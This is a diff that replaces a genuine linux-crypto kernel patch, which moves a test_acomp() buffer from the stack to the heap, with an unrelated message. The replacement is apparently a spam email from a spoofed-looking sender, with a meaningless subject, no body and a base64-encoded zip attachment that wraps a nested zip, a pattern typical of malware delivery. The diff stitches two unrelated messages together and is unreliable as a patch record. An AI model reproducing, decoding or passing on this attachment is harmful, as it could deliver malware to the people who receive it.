@@ -1,80 +1,63 @@
-From: Eric Biggers <ebiggers@google.com>
-Subject: [PATCH] crypto: acomp - don't use stack buffer in test_acomp()
-Date: Wed, 23 Nov 2016 10:24:35 -0800
-Message-ID: <1479925475-13732-1-git-send-email-ebiggers@google.com>
-Cc: Giovanni Cabiddu <giovanni.cabiddu@intel.com>,
-        Herbert Xu <herbert@gondor.apana.org.au>,
-        "David S. Miller" <davem@davemloft.net>,
-        Andy Lutomirski <luto@kernel.org>,
-        Eric Biggers <ebiggers@google.com>
-To: linux-crypto@vger.kernel.org
+From: <e.camilla.johansson@gmail.com>
+Subject: 53486 linux-crypto
+Date: Thu, 24 Nov 2016 06:32:53 -0000
+Message-ID: <147996917337.19811.1606826759980568057@voxconexao.com.br>
+Mime-Version: 1.0
+Content-Type: application/zip; name="INFO_93352944885680_linux-crypto.zip"
+Content-Transfer-Encoding: base64
+To: <linux-crypto@vger.kernel.org>
 Return-path: <linux-crypto-owner@vger.kernel.org>
-Received: from mail-pf0-f176.google.com ([209.85.192.176]:34541 "EHLO
-        mail-pf0-f176.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1752404AbcKWS1I (ORCPT
+Received: from 187-62-203-35.blr.voxconexao.com.br ([187.62.203.35]:38261 "HELO
+        voxconexao.com.br" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S1750935AbcKXGdi (ORCPT
         <rfc822;linux-crypto@vger.kernel.org>);
-        Wed, 23 Nov 2016 13:27:08 -0500
-Received: by mail-pf0-f176.google.com with SMTP id c4so4729641pfb.1
-        for <linux-crypto@vger.kernel.org>; Wed, 23 Nov 2016 10:27:08 -0800 (PST)
+        Thu, 24 Nov 2016 01:33:38 -0500
+Content-Disposition: attachment
 Sender: linux-crypto-owner@vger.kernel.org
 List-ID: <linux-crypto.vger.kernel.org>
 
-With virtually-mapped stacks (CONFIG_VMAP_STACK=y), using the
-scatterlist crypto API with stack buffers is not allowed, and with
-appropriate debugging options will cause the
-'BUG_ON(!virt_addr_valid(buf));' in sg_set_buf() to be triggered.
-Use a heap buffer instead.
-
-Fixes: d7db7a882deb ("crypto: acomp - update testmgr with support for acomp")
-Signed-off-by: Eric Biggers <ebiggers@google.com>
----
- crypto/testmgr.c | 11 ++++++++---
- 1 file changed, 8 insertions(+), 3 deletions(-)
-
-diff --git a/crypto/testmgr.c b/crypto/testmgr.c
-index ded50b6..aca1b7b 100644
---- a/crypto/testmgr.c
-+++ b/crypto/testmgr.c
-@@ -1448,17 +1448,21 @@ static int test_acomp(struct crypto_acomp *tfm, struct comp_testvec *ctemplate,
- {
- 	const char *algo = crypto_tfm_alg_driver_name(crypto_acomp_tfm(tfm));
- 	unsigned int i;
--	char output[COMP_BUF_SIZE];
-+	char *output;
- 	int ret;
- 	struct scatterlist src, dst;
- 	struct acomp_req *req;
- 	struct tcrypt_result result;
- 
-+	output = kmalloc(COMP_BUF_SIZE, GFP_KERNEL);
-+	if (!output)
-+		return -ENOMEM;
-+
- 	for (i = 0; i < ctcount; i++) {
- 		unsigned int dlen = COMP_BUF_SIZE;
- 		int ilen = ctemplate[i].inlen;
- 
--		memset(output, 0, sizeof(output));
-+		memset(output, 0, dlen);
- 		init_completion(&result.completion);
- 		sg_init_one(&src, ctemplate[i].input, ilen);
- 		sg_init_one(&dst, output, dlen);
-@@ -1507,7 +1511,7 @@ static int test_acomp(struct crypto_acomp *tfm, struct comp_testvec *ctemplate,
- 		unsigned int dlen = COMP_BUF_SIZE;
- 		int ilen = dtemplate[i].inlen;
- 
--		memset(output, 0, sizeof(output));
-+		memset(output, 0, dlen);
- 		init_completion(&result.completion);
- 		sg_init_one(&src, dtemplate[i].input, ilen);
- 		sg_init_one(&dst, output, dlen);
-@@ -1555,6 +1559,7 @@ static int test_acomp(struct crypto_acomp *tfm, struct comp_testvec *ctemplate,
- 	ret = 0;
- 
- out:
-+	kfree(output);
- 	return ret;
- }
- 
--- 
-2.8.0.rc3.226.g39d4020
+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
